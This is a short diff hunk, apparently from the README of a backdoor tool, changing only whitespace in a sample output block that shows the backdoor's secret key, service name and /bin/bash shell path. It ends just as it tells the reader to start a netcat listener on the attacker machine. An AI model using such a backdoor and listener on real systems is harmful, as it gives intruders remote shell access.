@@ -13,7 +13,7 @@ You can also ensure:
 ```
 $ ./backdoor -v
 Secret Key:		wA@2mC!dq
-Service Name:	    backdoor
+Service Name:	        backdoor
 Shell Path:		/bin/bash
 ```
 On the attacker machine start a netcat listener:
